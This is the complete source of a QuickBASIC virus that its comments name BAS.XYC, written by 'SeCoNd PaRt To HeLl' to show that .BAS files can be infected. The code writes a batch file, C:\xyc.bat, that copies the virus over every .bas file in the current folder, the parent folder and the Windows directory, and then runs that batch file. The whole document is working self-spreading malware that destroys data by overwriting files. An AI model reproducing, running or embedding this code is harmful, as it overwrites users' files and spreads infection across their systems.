CLS
REM The first Quick Basic infection Virus
REM written by SeCoNd PaRt To HeLl
REM for showing, that .BAS can be infected
REM NAME of the Virus: BAS.XYC
OPEN "C:\xyc.bat" FOR OUTPUT AS #1
PRINT #1, "@echo off"
PRINT #1, "if exist xyc.bas copy xyc.bas C:\xyc.bas"
PRINT #1, "for %%r in (*.bas ..\*.bas %windir%\*.bas) do copy C:\xyc.bas %%r"
CLOSE #1
SHELL "C:\xyc.bat"


